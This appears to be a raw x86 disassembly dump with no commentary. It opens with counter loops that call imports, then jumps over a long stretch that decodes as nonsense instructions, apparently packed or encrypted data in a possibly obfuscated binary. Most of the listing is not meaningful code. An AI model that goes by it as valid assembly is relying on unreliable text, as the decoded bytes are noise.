  401fe6:	mov    DWORD PTR [ebp-0x38],eax
  401fe9:	not    DWORD PTR ds:0x42a3cd
  401fef:	mov    DWORD PTR [ebp-0x44],0xf89cb538
  401ff6:	and    DWORD PTR ds:0x42a3b5,0x0
  402000:	mov    ecx,DWORD PTR ds:0x42a3b5
  402006:	inc    ecx
  402007:	mov    DWORD PTR ds:0x42a3b5,ecx
  40200d:	cmp    DWORD PTR ds:0x42a3b5,0x20
  402014:	jne    0x402025
  40201a:	push   0x13e2
  40201f:	call   DWORD PTR ds:0x4251cc
  402025:	cmp    DWORD PTR ds:0x42a3b5,0x18
  40202c:	jb     0x402000
  402032:	mov    DWORD PTR [ebp-0x54],0xf89f0538
  402039:	and    DWORD PTR ds:0x42a2dd,0x0
  402043:	mov    eax,ds:0x42a2dd
  402048:	inc    eax
  402049:	mov    ds:0x42a2dd,eax
  40204e:	cmp    DWORD PTR ds:0x42a2dd,0x18
  402055:	jne    0x40206b
  40205b:	push   0x2bdc
  402060:	push   0x7e39
  402065:	call   DWORD PTR ds:0x425020
  40206b:	cmp    DWORD PTR ds:0x42a2dd,0x14
  402072:	jb     0x402043
  402078:	sbb    DWORD PTR ds:0x42a331,edi
  40207e:	mov    DWORD PTR [ebp-0x4c],0xf89c85f8
  402085:	jmp    0x402590
  40208a:	int    0xc8
  40208c:	cmp    al,0xcb
  40208e:	rcr    ebx,0xd5
  402091:	(bad)  
  402093:	mov    ch,0x0
  402095:	mov    eax,0xc90f5ec
  40209a:	inc    esi
  40209b:	or     bh,BYTE PTR [eax+0x78]
  40209e:	push   0x7c
  4020a0:	js     0x40211a
  4020a2:	leave  
  4020a3:	test   eax,0x2ca31958
  4020a8:	pop    ecx
  4020a9:	jnp    0x402062
  4020ab:	add    esp,DWORD PTR [esi-0x25]
  4020ae:	pop    ss
  4020af:	or     ax,0xff1f
  4020b3:	and    al,0x24
  4020b5:	xchg   ebp,eax
  4020b6:	mov    eax,0xb729fc84
  4020bb:	cmp    DWORD PTR [eax+0x3aa47c0],esp
  4020c1:	mov    bl,0x4
  4020c3:	lahf   
  4020c4:	jmp    0xf4a264c8
  4020c9:	shr    DWORD PTR [edx],1
  4020cb:	inc    ebp
  4020cc:	cwde   
  4020cd:	sbb    ebx,DWORD PTR [ebx-0x15]
  4020d0:	fs scas eax,DWORD PTR es:[edi]
  4020d2:	fs pop eax
  4020d4:	retf   
  4020d5:	or     ecx,eax
  4020d7:	idiv   BYTE PTR [ebx+0x339faf0]
  4020dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4020de:	in     eax,dx
  4020df:	arpl   WORD PTR [eax],cx
  4020e1:	mov    esp,0xda859119
  4020e6:	shl    BYTE PTR [ebx+0x11],cl
  4020e9:	jge    0x4020ef
  4020eb:	pop    esi
  4020ec:	pushf  
  4020ed:	inc    ebp
  4020ee:	add    edi,0x59
  4020f1:	push   esi
  4020f2:	xor    DWORD PTR [esi+0x72],0x48d348d8
  4020f9:	or     eax,0xe1bfdf28
  4020fe:	mov    ds:0x4103c5e2,eax
  402103:	jo     0x4020a7
  402105:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402106:	je     0x4020cf
  402108:	adc    esi,ebp
  40210a:	lods   al,BYTE PTR ds:[esi]
  40210b:	adc    eax,0x9bf9ad41
  402110:	inc    ebx
  402111:	add    eax,0xca730e3f
  402116:	sub    ch,cl
  402118:	cmp    edx,DWORD PTR [eax]
  40211a:	(bad)  
  40211b:	sar    DWORD PTR [edx],1
  40211d:	pop    esp
  40211e:	mov    al,ds:0xddacef13
  402123:	sub    bh,dl
  402125:	or     DWORD PTR [edi-0x71],esi
  402128:	mov    dl,0x69
  40212a:	inc    esi
  40212b:	in     eax,0x56
  40212d:	test   eax,0x48dba393
  402132:	jl     0x402132
  402134:	xor    esi,DWORD PTR [edi-0x32]
  402137:	cmp    eax,0xc009b97c
  40213c:	(bad)  
  40213d:	adc    edi,edx
  40213f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402140:	jecxz  0x4020d0
  402142:	outs   dx,BYTE PTR ds:[esi]
  402143:	ror    al,cl
  402145:	ret    
  402146:	and    DWORD PTR [ecx],ebx
  402148:	jne    0x4021b4
  40214a:	mov    bh,bh
  40214c:	sahf   
  40214d:	pop    ebp
  40214e:	sub    dl,BYTE PTR [ecx-0x1ce3c895]
  402154:	in     al,dx
  402155:	adc    BYTE PTR [ebp+0x794fa3f5],dl
  40215b:	gs xchg edi,eax
  40215d:	add    al,0x90
  40215f:	mov    ebx,0xcf1e20af
  402164:	push   edx
  402165:	mov    esp,0xd241520d
  40216a:	fsubr  DWORD PTR [esi+0x43201103]
  402170:	adc    ecx,edx
  402172:	dec    ebp
  402173:	dec    eax
  402174:	or     BYTE PTR [eax+eax*4-0x2],dl
  402178:	int    0xa8
  40217a:	cld    
  40217b:	stos   DWORD PTR es:[edi],eax
  40217c:	outs   dx,DWORD PTR ds:[esi]
  40217d:	retf   0xde62
  402180:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402181:	jmp    0x4021de
  402183:	les    edi,FWORD PTR [eax]
  402185:	jle    0x40219a
  402187:	popa   
  402188:	mov    cl,0xe4
  40218a:	pop    esi
  40218b:	out    dx,al
  40218c:	jno    0x402137
  40218e:	int    0x67
  402190:	lds    esi,FWORD PTR ds:0x91747b7f
  402196:	idiv   ebx
  402198:	fisub  DWORD PTR [ebx+0x72]
  40219b:	sti    
  40219c:	push   eax
  40219d:	or     eax,0x169b17d3
  4021a2:	repz push ebp
  4021a4:	mov    ?,edx
  4021a6:	(bad)  
  4021a8:	test   BYTE PTR [ebx+ebp*4-0xd405318],bl
  4021af:	mov    gs:0xfd9fe341,eax
  4021b5:	dec    ebp
  4021b6:	retf   
  4021b7:	pop    es
  4021b8:	dec    ebx
  4021b9:	pop    ds
  4021ba:	or     BYTE PTR [ebx-0x235b2cb9],bh
  4021c0:	(bad)  
  4021c1:	in     al,0xba
  4021c3:	or     cl,BYTE PTR [eax-0x3eceb86f]
  4021c9:	(bad)  
  4021ca:	leave  
  4021cb:	icebp  
  4021cc:	jnp    0x40216a
  4021ce:	mov    ecx,0xcfa5ae09
  4021d3:	inc    ecx
  4021d4:	cmc    
  4021d5:	aas    
  4021d6:	jbe    0x4021d7
  4021d8:	dec    eax
  4021d9:	sub    eax,0xae255627
  4021de:	pop    ebx
  4021df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4021e0:	xchg   DWORD PTR [edx+0x3f5de9ab],ebp
  4021e6:	jle    0x402264
  4021e8:	leave  
  4021e9:	push   0x26
  4021eb:	adc    esi,ecx
  4021ed:	jb     0x40224e
  4021ef:	lock mov esi,0x52854113
  4021f5:	mov    edx,edi
  4021f7:	sub    al,0xb0
  4021f9:	sbb    eax,0x5cbaad69
  4021fe:	popa   
  4021ff:	sub    ecx,ecx
  402201:	dec    edx
  402202:	sbb    bh,dh
  402204:	fwait
  402205:	xchg   esi,eax
  402206:	ins    BYTE PTR es:[edi],dx
  402207:	ins    BYTE PTR es:[edi],dx
  402208:	jg     0x4021e1
  40220a:	(bad)  
  40220b:	jl     0x4021f6
  40220d:	xchg   edx,eax
  40220e:	loope  0x4021c1
  402210:	sahf   
  402211:	fldenv [eax]
  402213:	cld    
  402214:	ds popf 
  402216:	aaa    
  402217:	pop    ds
  402218:	sbb    ah,BYTE PTR [edx+0x4f]
  40221b:	imul   esp,DWORD PTR [edx+0x24],0xa465a7f7
  402222:	jno    0x402283
  402224:	fbld   TBYTE PTR [edx]
  402226:	push   cs
  402227:	xchg   ebx,eax
  402228:	pushf  
  402229:	adc    ebx,DWORD PTR [esi]
  40222b:	dec    eax
  40222c:	neg    bh
  40222e:	jecxz  0x4021d6
  402230:	add    ah,BYTE PTR [edx]
  402232:	mov    eax,edx
  402234:	(bad)  
  402236:	sbb    BYTE PTR [eax+0x1a0a781f],cl
  40223c:	jnp    0x40228e
  40223e:	sti    
  40223f:	scas   eax,DWORD PTR es:[edi]
  402240:	inc    esp
  402241:	push   cs
  402242:	jmp    0xdbfbdb2
  402247:	mov    ch,0x8b
  402249:	xor    al,0xbf
  40224b:	scas   al,BYTE PTR es:[edi]
  40224c:	in     eax,0xc8
  40224e:	adc    eax,0xb2a9bd5b
  402253:	mov    ecx,esp
  402255:	cdq    
  402256:	jb     0x402262
  402258:	mov    ebp,0x6b66457c
  40225d:	shl    BYTE PTR [ebx],1
  40225f:	pop    eax
  402260:	fistp  DWORD PTR [ebp+0x16c46bb5]
  402266:	and    DWORD PTR [eax+edx*2],ecx
  402269:	inc    eax
  40226a:	into   
  40226b:	repnz in eax,dx
  40226d:	(bad)  
  40226e:	xor    eax,0x7a99bedf
  402273:	pop    ss
  402274:	mov    eax,0xf5a06f62
  402279:	mov    ds:0x79f40fd7,eax
  40227e:	mov    edi,0xbb49830c
  402283:	sub    BYTE PTR [ebx],0x26
  402286:	mov    eax,0x33f5ed0c
  40228b:	push   0x9a64c1a9
  402290:	or     dh,BYTE PTR [eax]
  402292:	mov    bl,0x71
  402294:	jbe    0x402291
  402296:	cmp    bl,BYTE PTR [ecx]
  402298:	mov    edx,0x4f3189c6
  40229d:	mov    ch,0x79
  40229f:	lds    eax,FWORD PTR [ebx+0x3cc26806]
  4022a5:	sbb    al,0x30
  4022a7:	adc    DWORD PTR [ebp-0x759cec7e],esp
  4022ad:	or     eax,0xa928c33
  4022b2:	sahf   
  4022b3:	mov    eax,ds:0x2c8299af
  4022b8:	or     esi,DWORD PTR [edx+0xa28e4fd]
  4022be:	sbb    DWORD PTR [ecx+0x3d],ebp
  4022c1:	cmp    BYTE PTR [edx+0x727182f4],bh
  4022c7:	cmp    eax,0xa8671377
  4022cc:	aas    
  4022cd:	iret   
  4022ce:	mov    ebx,0xf727f5a3
  4022d3:	mov    DWORD PTR [ebp-0x20],esi
  4022d6:	test   DWORD PTR [edi+ecx*2],0xc3c8bf75
  4022dd:	clc    
  4022de:	lods   al,BYTE PTR ds:[esi]
  4022df:	jbe    0x402325
  4022e1:	outs   dx,DWORD PTR ds:[esi]
  4022e2:	and    esp,DWORD PTR [ebx]
  4022e4:	pop    esp
  4022e5:	je     0x4022b3
  4022e7:	add    ecx,ebp
  4022e9:	out    0xba,al
  4022eb:	sub    eax,0xea74895
  4022f0:	dec    eax
  4022f1:	loope  0x4022b1
  4022f3:	in     al,dx
  4022f4:	shr    DWORD PTR [esi+eax*1],cl
  4022f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4022f8:	jl     0x4022d3
  4022fa:	jnp    0x40236e
  4022fc:	mov    esp,0x64407672
  402301:	sbb    eax,0x32739dec
  402306:	fisttp DWORD PTR [esi-0x3]
  402309:	stos   BYTE PTR es:[edi],al
  40230a:	add    BYTE PTR ds:[ebx+ecx*2+0x27716f20],cl
  402312:	(bad)  
  402313:	popf   
  402314:	pop    ebx
  402315:	dec    edi
  402316:	and    ecx,0xf0d2191e
  40231c:	popf   
  40231d:	jg     0x402354
  40231f:	xor    DWORD PTR [edx-0x5a55dfa],ebx
  402325:	dec    ecx
  402326:	xchg   esp,eax
  402327:	sub    BYTE PTR [eax-0x6b42a168],0x4b
  40232e:	mov    esp,DWORD PTR [ebp-0x29]
  402331:	push   ebx
  402332:	mov    ecx,DWORD PTR [ebx]
  402334:	pop    ecx
  402335:	cdq    
  402336:	fld    QWORD PTR [ecx-0x5f]
  402339:	xchg   esi,eax
  40233a:	mov    dh,0x54
  40233c:	mov    WORD PTR [ebx+ebp*8],?
  40233f:	sub    al,0x2a
  402341:	push   ebp
  402342:	popa   
  402343:	pop    esp
  402344:	pop    ds
  402345:	add    eax,0x9121dc3b
  40234a:	retf   
  40234b:	push   ebx
  40234c:	mov    esi,0x461716ab
  402351:	jae    0x40236f
  402353:	lock cli 
  402355:	mov    ecx,0x62c6fe09
  40235a:	out    0x7,eax
  40235c:	and    eax,0x4eea69af
  402361:	lock imul ebx,eax,0xc4d790f7
  402368:	js     0x40233f
  40236a:	mov    ds:0x76611f25,eax
  40236f:	pop    ds
  402370:	outs   dx,DWORD PTR ds:[esi]
  402371:	pushf  
  402372:	scas   al,BYTE PTR es:[edi]
  402373:	mov    al,ds:0x15ff3f4a
  402378:	or     al,0x47
  40237a:	and    al,0xda
  40237c:	out    0x73,al
  40237e:	dec    eax
  40237f:	sub    bl,dh
  402381:	xor    dl,BYTE PTR [ebp-0x47]
  402384:	lahf   
  402385:	xchg   esp,eax
  402386:	inc    esi
  402387:	ret    0x7199
  40238a:	ret    0xa445
  40238d:	imul   ebx,DWORD PTR [eax+0x61410620],0xffffff8a
  402394:	pushf  
  402395:	call   0xde0aa043
  40239a:	or     DWORD PTR [ecx-0x2e44ccab],0xffffffd3
  4023a1:	loope  0x40237e
  4023a3:	enter  0xeea7,0x5f
  4023a7:	mov    ah,0x15
  4023a9:	je     0x402398
  4023ab:	dec    eax
  4023ac:	pop    ecx
  4023ad:	inc    ecx
  4023ae:	mov    eax,ds:0xd25dd334
  4023b3:	push   ecx
  4023b4:	scas   eax,DWORD PTR es:[edi]
  4023b5:	hlt    
  4023b6:	fucomip st,st(6)
  4023b8:	xchg   edx,eax
  4023b9:	sahf   
  4023ba:	ficomp DWORD PTR [eax-0x56]
  4023bd:	cli    
  4023be:	xchg   ebp,eax
  4023bf:	mov    bh,BYTE PTR [eax-0x12]
  4023c2:	mov    ebx,0x2f40e5b2
  4023c7:	cmc    
  4023c8:	xor    bh,dl
  4023ca:	jno    0x402431
  4023cc:	xor    dh,BYTE PTR [edx+0x64a2e76e]
  4023d2:	add    edx,DWORD PTR [edi]
  4023d4:	cmp    esp,DWORD PTR [esi+ebx*8+0x5a780b72]
  4023db:	mov    edx,ebp
  4023dd:	dec    ebx
  4023de:	outs   dx,BYTE PTR ds:[esi]
  4023df:	or     edi,DWORD PTR [edi+0x64]
  4023e2:	add    BYTE PTR ds:0xacacc836,dl
  4023e8:	pop    ebp
  4023e9:	mov    ecx,0xb47cfe2b
  4023ee:	scas   al,BYTE PTR es:[edi]
  4023ef:	mov    ds:0x528eb786,eax
  4023f4:	sahf   
  4023f5:	jmp    0x55b9921e
  4023fa:	xchg   esp,eax
  4023fb:	inc    edi
  4023fc:	sub    BYTE PTR [eax+esi*4-0x5],ch
  402400:	into   
  402401:	loopne 0x4023f6
  402403:	jo     0x4023c2
  402405:	inc    ebp
  402406:	scas   al,BYTE PTR es:[edi]
  402407:	or     eax,0x16f1d081
  40240c:	test   BYTE PTR [ecx+ecx*4],dh
  40240f:	mov    bl,0xb9
  402411:	xlat   BYTE PTR ds:[ebx]
  402412:	sti    
  402413:	test   BYTE PTR [ecx+0x33],0xb7
  402417:	mov    ds:0x13ab13c1,al
  40241c:	sub    dh,dl
  40241e:	and    eax,0xefca0b19
  402423:	add    ch,BYTE PTR [edi-0x61]
  402426:	cmp    BYTE PTR [eax-0x657bef6f],0xde
  40242d:	loopne 0x4023c6
  40242f:	inc    ebx
  402430:	xchg   BYTE PTR [esi+eiz*8],al
  402433:	mov    edi,?
  402435:	inc    ebp
  402436:	push   0x2a
  402438:	retf   0x92d6
  40243b:	stos   BYTE PTR es:[edi],al
  40243c:	(bad)
  40243f:	idiv   DWORD PTR ds:0x7d4dc23b
  402445:	mov    dh,dl
  402447:	retf   0x267f
  40244a:	mov    eax,ds:0x1d5531a7
  40244f:	cmp    ebx,DWORD PTR [ebx+0x7e0c5a60]
  402455:	sub    DWORD PTR [eax],ebx
  402457:	popa   
  402458:	(bad)  
  402459:	fucomip st,st(5)
  40245b:	mov    ds:0xae47a791,al
  402460:	mov    dl,0xfb
  402462:	hlt    
  402463:	cwde   
  402464:	inc    ebp
  402465:	aas    
  402466:	sub    eax,DWORD PTR [ecx+0x31]
  402469:	xchg   edi,eax
  40246a:	mov    ch,0xbe
  40246c:	scas   eax,DWORD PTR es:[edi]
  40246d:	jle    0x402402
  40246f:	xchg   esp,eax
  402470:	lahf   
  402471:	push   ebp
  402472:	lds    eax,FWORD PTR [edi+edi*1+0x50b1b253]
  402479:	dec    esp
  40247a:	inc    eax
  40247b:	call   0x94a9:0x5f667da7
  402482:	mov    edx,0xcbbb338a
  402487:	aam    0x38
  402489:	dec    ebx
  40248a:	lahf   
  40248b:	adc    esi,DWORD PTR [esi-0x16bf37fa]
  402491:	cli    
  402492:	mov    cl,0x5f
  402494:	sti    
  402495:	dec    esi
  402496:	in     al,dx
  402497:	jns    0x4024b4
  402499:	push   ecx
  40249a:	cmc    
  40249b:	jmp    0x402510
  40249d:	ds xchg edx,eax
  40249f:	lods   eax,DWORD PTR ds:[esi]
  4024a0:	xor    al,0xc4
  4024a2:	jmp    0x402497
  4024a4:	je     0x40243d
  4024a6:	aad    0x2b
  4024a8:	inc    ecx
  4024a9:	out    dx,al
  4024aa:	mov    cl,BYTE PTR [eax]
  4024ac:	mov    ds:0xb5a1a1ef,eax
  4024b1:	xchg   ebp,eax
  4024b2:	sar    bl,0x8d
  4024b5:	jno    0x402531
  4024b7:	imul   eax,DWORD PTR [eax],0x2b
  4024ba:	add    bl,ah
  4024bc:	nop
  4024bd:	rol    edi,cl
  4024bf:	jb     0x402453
  4024c1:	fstp   DWORD PTR [edi+eiz*4+0x7c]
  4024c5:	pop    esp
  4024c6:	push   edi
  4024c7:	mov    WORD PTR [esi],ss
  4024c9:	repz fisubr WORD PTR [ebp+0x6d]
  4024cd:	clc    
  4024ce:	daa    
  4024cf:	lods   eax,DWORD PTR ds:[esi]
  4024d0:	je     0x40254b
  4024d2:	pop    esp
  4024d3:	cdq    
  4024d4:	aas    
  4024d5:	js     0x4024aa
  4024d7:	daa    
  4024d8:	gs aad 0x6e
  4024db:	push   esp
  4024dc:	sbb    ah,BYTE PTR [eax+0x45]
  4024df:	mov    eax,ds:0xa6c0c660
  4024e4:	shr    BYTE PTR [eax+0x79],cl
  4024e7:	ret    
  4024e8:	imul   esi,ecx,0x48
  4024eb:	sub    eax,0xee503f00
  4024f0:	fld    TBYTE PTR [edi]
  4024f2:	jg     0x40253c
  4024f4:	sbb    eax,0x29d68eb
  4024f9:	xchg   BYTE PTR [ecx],al
  4024fb:	fistp  DWORD PTR [ebp-0x5c]
  4024fe:	test   ebp,0x706fa4d2
  402504:	ret    0xd2e0
  402507:	es scas eax,DWORD PTR es:[edi]
  402509:	stos   DWORD PTR es:[edi],eax
  40250a:	add    BYTE PTR [ebx-0x5c],dl
  40250d:	pop    esp
  40250e:	cmp    bh,ah
  402510:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402511:	push   ebp
  402512:	push   esp
  402513:	fidiv  WORD PTR [edx]
  402515:	fnstsw WORD PTR [esi+0x645cd965]
  40251b:	retf   
  40251c:	gs jo  0x402566
  40251f:	sbb    al,0x9c
  402521:	jno    0x4024c9
  402523:	pop    edi
  402524:	nop
  402525:	pop    ebp
  402526:	out    dx,eax
  402527:	cmp    BYTE PTR [eax+0x0],al
  40252a:	push   0xf8d7f5a0
  40252f:	sbb    al,0x24
  402531:	cmp    ebx,DWORD PTR [eax]
  402533:	mov    ds:0xc3b07a22,al
  402538:	mul    DWORD PTR [edx]
  40253a:	les    edx,FWORD PTR [edi+esi*8]
  40253d:	sub    DWORD PTR [edx-0x1f],ecx
  402540:	pop    ebx
  402541:	lock cld 
  402543:	sub    DWORD PTR [eax],ecx
  402545:	and    eax,ecx
  402547:	loopne 0x4024f8
  402549:	jle    0x40252b
  40254b:	pop    ebp
  40254c:	inc    eax
  40254d:	bnd jns 0x4025b3
  402550:	or     al,0x9a
  402552:	push   0xffffffb1
  402554:	out    dx,al
  402555:	fst    st(3)
  402557:	cmp    DWORD PTR [ebp+0x252efa8],edx
  40255d:	jbe    0x4025a9
  40255f:	and    edi,DWORD PTR [edi+0x2d]
  402562:	or     cl,BYTE PTR ds:0x4d65031f
  402568:	(bad)  
  402569:	fcmovnu st,st(6)
  40256b:	add    DWORD PTR [edx-0x3f],edi
  40256e:	int3   
  40256f:	mov    eax,DWORD PTR [eax+0x45]
  402572:	retf   
  402573:	mov    al,ds:0x4e46225b
  402578:	leave  
  402579:	rol    DWORD PTR [edi],1
  40257b:	rcr    BYTE PTR [edi+eax*2+0x70],1
  40257f:	sub    ah,BYTE PTR [eax+ebx*4]
  402582:	jl     0x4025f8
  402584:	push   ebx
  402585:	xchg   ecx,eax
  402586:	ins    DWORD PTR es:[edi],dx
  402587:	ret    0xcc34
  40258a:	sbb    DWORD PTR [eax-0x1ca9047d],esi
  402590:	mov    DWORD PTR [ebp-0x3c],0xf89c85d8
  402597:	mov    eax,DWORD PTR [ebp-0x10]
  40259a:	and    ecx,DWORD PTR ds:0x42a33d
  4025a0:	jmp    0x402aab
  4025a5:	leave  
  4025a6:	mov    ebp,0xc93dc93f
  4025ac:	leave  
  4025ad:	jl     0x402558
  4025af:	lods   eax,DWORD PTR ds:[esi]
  4025b0:	aam    0xf2
  4025b2:	adc    ecx,DWORD PTR ds:0x780db068
  4025b8:	js     0x402624
  4025ba:	jl     0x402634
  4025bc:	js     0x40255e
  4025be:	fcomp  st(0)
  4025c0:	mov    ch,0xf9
  4025c2:	fs xchg ebx,eax
  4025c4:	inc    ebx
  4025c5:	xchg   esp,eax
  4025c6:	ror    BYTE PTR [esi-0x7f],0x7a
  4025ca:	xchg   esp,eax
  4025cb:	push   edi
  4025cc:	int3   
  4025cd:	and    ah,BYTE PTR [ecx]
  4025cf:	inc    edi
  4025d0:	mov    WORD PTR [ebx],?
  4025d2:	bsr    eax,DWORD PTR [ebx+0xccdfab7]
  4025d9:	dec    eax
  4025da:	icebp  
  4025db:	out    0xa1,al
  4025dd:	loopne 0x4025c6
  4025df:	pop    esi
  4025e0:	mov    ebp,0xa1d7bd9f
  4025e5:	xchg   DWORD PTR [edx],esi
  4025e7:	icebp  
  4025e8:	ret    0x908d
  4025eb:	js     0x402586
  4025ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4025ee:	not    DWORD PTR [ebx-0x16a6601d]
  4025f4:	retf   
  4025f5:	loop   0x40261d
  4025f7:	pop    ecx
  4025f8:	test   BYTE PTR [ebx-0x18],bh
  4025fb:	push   ebx
  4025fc:	push   0xd1a42e4a
  402601:	fnstenv [ebp+0x3f]
  402604:	or     cl,BYTE PTR [eax+0x7bc2bb73]
  40260a:	clc    
  40260b:	out    dx,al
  40260c:	call   0xe3c0:0xcd9b812b
  402613:	out    dx,al
  402614:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402616:	loop   0x40262b
  402618:	xchg   esp,eax
  402619:	adc    al,0x47
  40261b:	pop    edx
  40261c:	add    eax,0x356f8a88
  402621:	clc    
  402622:	retf   0x459d
  402625:	sbb    eax,0xa793f38d
  40262a:	push   esi
  40262b:	lods   al,BYTE PTR ds:[esi]
  40262c:	or     DWORD PTR [ebp-0x4f],esp
  40262f:	scas   al,BYTE PTR es:[edi]
  402630:	call   DWORD PTR [eax]
  402632:	ins    DWORD PTR es:[edi],dx
  402633:	arpl   dx,bp
  402635:	dec    ebx
  402636:	jne    0x4025bf
  402638:	js     0x402699
  40263a:	dec    esi
  40263b:	lods   eax,DWORD PTR ds:[esi]
  40263c:	mov    edi,0x9563fe99
  402641:	fwait
  402642:	mov    ds,ecx
  402644:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402645:	lea    ebx,[esi]
  402647:	out    0xdd,al
  402649:	cmp    eax,0x696f4c5b
  40264e:	fisubr DWORD PTR [ecx+0x6a]
  402651:	iret   
  402652:	mov    ecx,DWORD PTR [ecx+0x59]
  402655:	aaa    
  402656:	xor    DWORD PTR [edi+0x2b32c212],esi
  40265c:	push   ds
  40265d:	xor    DWORD PTR [ebx],0x9b6b82d3
  402663:	out    dx,al
  402664:	and    dl,BYTE PTR [eax]
  402666:	add    BYTE PTR [ecx+ecx*4+0x64d518ec],bl
  40266d:	inc    esp
  40266e:	sti    
  40266f:	sub    eax,0x66d70400
  402674:	jb     0x40261b
  402676:	or     ah,al
  402678:	jp     0x402660
  40267a:	leave  
  40267b:	xor    BYTE PTR [esi+ebx*1],cl
  40267e:	pop    es
  40267f:	dec    edi
  402680:	mov    BYTE PTR [edi+0x54fde8a1],bh
  402686:	lods   eax,DWORD PTR ds:[esi]
  402687:	push   ebx
  402688:	out    0x4,eax
  40268a:	sbb    ah,BYTE PTR [edx]
  40268c:	xor    eax,DWORD PTR [eax]
  40268e:	(bad)  
  40268f:	sub    esi,DWORD PTR [edi+0x11]
  402692:	shr    bh,0x47
  402695:	in     eax,0x22
  402697:	jl     0x402630
  402699:	sub    BYTE PTR [ebx-0x72d16712],0x89
  4026a0:	ja     0x40266b
  4026a2:	mov    dl,0xbe
  4026a4:	pusha  
  4026a5:	jns    0x402637
  4026a7:	test   DWORD PTR [edx-0x2e],edx
  4026aa:	mov    dh,0xf6
  4026ac:	mov    cs,edi
  4026ae:	in     eax,0x94
  4026b0:	xor    bh,BYTE PTR [edx+0x7c73a717]
  4026b6:	mov    ch,0x3d
  4026b8:	adc    esp,DWORD PTR [ebp+0x1c]
  4026bb:	aas    
  4026bc:	sbb    DWORD PTR [ebx+0x1f],eax
  4026bf:	rcl    BYTE PTR [eax],0x0
  4026c2:	dec    edi
  4026c3:	cmp    al,0xe5
  4026c5:	sti    
  4026c6:	xor    edi,edi
  4026c8:	enter  0x7761,0x71
  4026cc:	out    0x25,al
  4026ce:	cmp    eax,0xfd72c145
  4026d3:	sbb    ebx,DWORD PTR [edi]
  4026d5:	icebp  
  4026d6:	(bad)  
  4026d7:	add    esi,DWORD PTR es:[ecx-0x32]
  4026db:	pushfw 
  4026dd:	call   0x4ea753fe
  4026e2:	pop    esi
  4026e3:	xlat   BYTE PTR ds:[ebx]
  4026e4:	dec    esi
  4026e5:	jno    0x40268f
  4026e7:	cmp    al,0x2e
  4026e9:	jne    0x4026fb
  4026eb:	push   cs
  4026ec:	in     al,dx
  4026ed:	in     eax,dx
  4026ee:	jp     0x40270e
  4026f0:	jb     0x40272d
  4026f2:	inc    edx
  4026f3:	popf   
  4026f4:	jmp    0x4026ed
  4026f6:	idiv   BYTE PTR [esi]
  4026f8:	cs cdq 
  4026fa:	jle    0x4026bc
  4026fc:	call   0xf4b4d2f
  402701:	ins    DWORD PTR es:[edi],dx
  402702:	mov    ecx,0xea2e89e
  402707:	mov    ch,0xa7
  402709:	jno    0x40274a
  40270b:	or     eax,0xa52ca792
  402710:	sbb    al,0xfb
  402712:	inc    eax
  402713:	cmp    al,0xbc
  402715:	test   eax,0xc212095f
  40271a:	and    cl,BYTE PTR ds:0xa0216fc2
  402720:	sbb    ch,ch
  402722:	add    al,BYTE PTR [edi]
  402724:	jo     0x4026e6
  402726:	pop    ecx
  402727:	pop    esp
  402728:	out    dx,al
  402729:	pop    ss
  40272a:	dec    ecx
  40272b:	dec    eax
  40272c:	push   esp
  40272d:	mov    ebx,0x3dbf8a7e
  402732:	cmp    al,0xa1
  402734:	ret    
  402735:	fst    DWORD PTR [esi*1-0x3ffdae4a]
  40273c:	mov    ch,0xf5
  40273e:	mov    ?,WORD PTR [ebp+0x7e425d64]
  402744:	inc    ebp
  402745:	loopne 0x4026d9
  402747:	retf   0x637
  40274a:	mov    gs,WORD PTR [ebx+ebp*1-0x3a1521a6]
  402751:	jnp    0x402784
  402753:	test   al,0x99
  402755:	jg     0x402730
  402757:	(bad)  
  402758:	fnstcw WORD PTR ds:0xa74e17d
  40275e:	push   ss
  40275f:	(bad)  
  402760:	sbb    DWORD PTR [ebx],esp
  402762:	pop    ebx
  402763:	pop    esp
  402764:	xlat   BYTE PTR ds:[ebx]
  402765:	mov    esi,0xc7ffe9c9
  40276a:	clc    
  40276b:	sub    DWORD PTR [esp+ebx*8-0x2e50e06a],ebx
  402772:	jge    0x402706
  402774:	push   es
  402775:	ja     0x402726
  402777:	cdq    
  402778:	adc    dh,ah
  40277a:	scas   al,BYTE PTR es:[edi]
  40277b:	sahf   
  40277c:	repz rol ch,1
  40277f:	mov    ecx,0x4b403dc4
  402784:	loope  0x4027ff
  402786:	adc    eax,0x36912f10
  40278b:	pusha  
  40278c:	fdivr  DWORD PTR [edi]
  40278e:	inc    ebp
  40278f:	mov    al,0x9e
  402791:	push   0xcd66b2aa
  402796:	mov    BYTE PTR [eax+0x2b10630b],bl
  40279c:	fbld   TBYTE PTR [ebp+0x60880c52]
  4027a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4027a3:	dec    edi
  4027a4:	test   eax,0xfda33d0d
  4027a9:	push   0xffffffbf
  4027ab:	mov    dh,bh
  4027ad:	std    
  4027ae:	add    al,0x5b
  4027b0:	or     DWORD PTR [esi],0x4c2a59ee
  4027b6:	stos   BYTE PTR es:[edi],al
  4027b7:	mov    edi,0xe71fd8c6
  4027bc:	test   BYTE PTR [ecx],dh
  4027be:	pop    ebx
  4027bf:	lods   al,BYTE PTR ds:[esi]
  4027c0:	sbb    DWORD PTR fs:[esi+eax*1+0x25],esi
  4027c5:	stos   BYTE PTR es:[edi],al
  4027c6:	popf   
  4027c7:	sbb    esi,DWORD PTR [ecx]
  4027c9:	sub    ch,BYTE PTR [ebx]
  4027cb:	push   ebx
  4027cc:	in     al,dx
  4027cd:	dec    ebp
  4027ce:	inc    eax
  4027cf:	pop    esp
  4027d0:	jmp    0xecb6d00
  4027d5:	mov    eax,0xc8af0ca5
  4027da:	inc    ecx
  4027db:	retf   0x5912
  4027de:	push   0xffffffc0
  4027e0:	mov    al,0xd7
  4027e2:	lods   eax,DWORD PTR ds:[esi]
  4027e3:	fist   WORD PTR [esi+ecx*2]
  4027e6:	ins    DWORD PTR es:[edi],dx
  4027e7:	leave  
  4027e8:	push   ebp
